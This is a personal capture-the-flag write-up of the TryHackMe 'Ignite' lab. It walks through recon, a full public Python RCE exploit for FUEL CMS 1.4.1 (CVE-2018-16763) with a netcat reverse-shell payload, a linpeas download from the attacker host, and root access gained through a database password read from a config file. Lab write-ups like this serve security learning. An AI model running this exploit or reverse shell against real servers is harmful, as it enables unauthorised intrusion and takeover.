---
title: "Iginite THM"
date: 2024-08-01T17:33:57-07:00
draft: false
---
IP=10.10.179.198

```sh
ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP -oN nmap-p | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

PORT   STATE SERVICE
80/tcp open  http

 nmap -sCV -p$ports $IP -oN nmap-sCV

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

```sh
-[Thu Aug 01-15:40:51]-[jmk@parrot]-
-[~/Documents/Ignute-THM]$ searchsploit Apache 2.4.18
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execut | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Sc | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' L | linux/local/46676.php
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak             | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service          | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer  | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffe | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffe | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Tr | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing            | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal          | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)    | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC) | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / R | linux/remote/34.pl
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
On Gobuster and to burpsuite

```sh
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster-dir.txt

/index                (Status: 200) [Size: 16597]
/home                 (Status: 200) [Size: 16597]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.10.179.198/assets/]
/'                    (Status: 400) [Size: 1134]
/$FILE                (Status: 400) [Size: 1134]
/$file                (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/*checkout*           (Status: 400) [Size: 1134]
/*docroot*            (Status: 400) [Size: 1134]
/*                    (Status: 400) [Size: 1134]
/$File                (Status: 400) [Size: 1134]
/!ut                  (Status: 400) [Size: 1134]
/search!default       (Status: 400) [Size: 1134]
/msgReader$1          (Status: 400) [Size: 1134]
/guestsettings!default (Status: 400) [Size: 1134]
/login!withRedirect   (Status: 400) [Size: 1134]
/$1                   (Status: 400) [Size: 1134]



```


![Fuel-CMS.png](/Fuel-CMS.png)

also 
![feul_admin.png](/feul_admin.png)

This login worked
There is a link to the documentation and we see
```text
## What is FUEL CMS?

[FUEL CMS](http://getfuelcms.com/) is a hybrid of a CMS and a framework. At its core, FUEL is a PHP/MySQL, modular-based development platform built on top of the popular [CodeIgniter](http://www.codeigniter.com/) framework.

Learn more at [getfuelcms.com](http://getfuelcms.com/).
```
So maybe a PHP reverse shell?
but first a quick google search I found this [posible exploit](https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated)

the script 
```py
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1) Updated
# Date 2021-08-16
# Exploit Author: jtaubs1 (ice-wzl)
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

# Update included: Works with python3
    # Removed burp proxy code to allow it to run as a stand alone RCE exploit. 
    # Takes sys.args
    # Spawns a Reverse shell

#!/usr/bin/python3
import requests
import urllib.parse
import sys


url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc " 
command += ip 
command += " "
command += port
command += ">/tmp/f"

payload = url + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(command)+"%27%29%2b%27"
r = requests.get(payload)
print(r)

```
to use - from the GitHub link
![how-to-use-attack.png](/how-to-use-attack.png)

so run the script
```sh
[Thu Aug 01-16:03:41]-[jmk@parrot]-
-[~/Documents/Ignute-THM]$ python3 upload.py http://$IP 10.2.35.253 4444
```

and on the listener 
```sh
-[Thu Aug 01-16:03:56]-[jmk@parrot]-
-[~]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.2.35.253] from (UNKNOWN) [10.10.179.198] 58574
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home/www-data
$ ls
flag.txt
$ cat flag.txt
6470<snip>059b
$ pwd
/home/www-data
$ wget http://10.2.35.253:8000/linpeas.sh
--2024-08-01 16:34:07--  http://10.2.35.253:8000/linpeas.sh
Connecting to 10.2.35.253:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 862777 (843K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  5%  156K 5s
<snip>
   800K .......... .......... .......... .......... ..        100%  107M=1.4s

2024-08-01 16:34:09 (586 KB/s) - 'linpeas.sh' saved [862777/862777]

$ chmod +x linpeas.sh
$ ./linpeas.sh
<sinp>
╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
^Chugo 

```
so I downloaded [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)and hosted it in my parrot VM and rand 
```sh
ip a
python3 -m http.server
```
It is running super slow -- the point I stopped it was over an hour of run time.
While waiting looked back at the home page and noticed this.
![privle-vect.png](/privle-vect.png)

so lets chck it out
```sh
$ cd /var/www/html/fuel/application/config
$ pwd
/var/www/html/fuel/application/config
$ cat database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}

```
at the end we see
```php

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```
lets try the password
```sh
$ su root
su: must be run from a terminal
## so yeah 
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html/fuel/application/config$
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config#
root@ubuntu:/var/www/html/fuel/application/config# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bb<snip>482d

```

during the linpeas wait I was looking for possible vectors and found this wright up by [the4rchangel](https://exploits.run/ignite/) it helped me find the easy anwswer.Thank you.
Note to self **Read More**. 

